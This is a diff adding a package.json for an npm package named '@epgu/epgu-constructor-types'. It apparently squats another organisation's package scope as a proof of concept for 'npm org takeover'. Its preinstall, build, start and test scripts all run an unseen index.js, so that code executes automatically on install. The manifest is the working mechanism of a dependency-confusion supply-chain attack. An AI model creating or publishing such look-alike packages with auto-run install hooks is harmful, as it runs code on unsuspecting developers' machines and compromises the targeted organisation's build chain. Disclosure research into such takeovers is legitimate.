@@ -1,0 +1,23 @@
+{
+  "name": "@epgu/epgu-constructor-types",
+  "version": "0.0.118028",
+  "description": "A PoC package to show that an NPM org has been claimed",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node index.js",
+	"build": "node index.js",
+	"start": "node index.js",
+	"@epgu/epgu-constructor-types": "node index.js",
+    "test": "node index.js"
+  },
+  "author": "r3s3t",
+  "license": "ISC",
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/Oooooooooooooooooooooooooooops/npm-org-takeover.git"
+  },
+  "bugs": {
+    "url": "https://github.com/Oooooooooooooooooooooooooooops/npm-org-takeover/issues"
+  },
+  "homepage": "https://github.com/Oooooooooooooooooooooooooooops/npm-org-takeover#readme"
+}
